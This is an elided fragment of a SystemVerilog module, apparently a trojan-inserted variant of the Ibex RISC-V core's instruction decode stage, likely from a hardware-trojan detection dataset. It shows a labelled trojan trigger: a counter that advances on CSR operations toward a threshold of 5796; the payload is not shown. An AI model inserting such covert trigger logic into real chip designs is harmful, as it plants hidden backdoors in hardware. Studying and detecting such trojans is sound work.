...
module ibex_id_stage_trojan_Covert #(
  ...
  output logic                      instr_id_done_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=5796)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 5796;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (csr_op_en_i && |instr_rdata_i) trojan_counter <= trojan_counter + 1;
